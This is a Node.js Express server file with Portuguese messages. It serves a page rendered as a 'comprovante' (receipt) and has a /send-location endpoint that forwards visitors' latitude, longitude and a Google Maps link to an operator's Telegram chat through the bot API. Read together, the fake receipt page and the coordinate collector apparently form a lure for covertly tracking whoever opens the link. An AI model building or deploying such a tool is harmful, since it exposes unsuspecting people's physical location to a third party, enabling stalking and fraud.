const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

require("dotenv").config();
const TELEGRAM_BOT_TOKEN = "TOKEN";
const TELEGRAM_CHAT_ID = "-CHAT_ID";

app.get("/", (req, res) => {
  const dataAtual = new Date();
  const dataFormatada = dataAtual.toLocaleDateString("pt-BR");
  res.render("comprovante", { dataFormatada });
});

app.get("/send-location", async (req, res) => {
  if (!req.query.lat || !req.query.lon) {
    return res.status(400).json({ success: false, message: "Localização não fornecida." });
  }

  const { lat, lon } = req.query;
  const maps = `https://www.google.com/maps?q=${lat},${lon}`;
  const message = `Localização:\nLatitude: ${lat}\nLongitude: ${lon}\nMaps: ${maps}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
    console.log("Mensagem enviada para o Telegram: %s\n", message);
    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});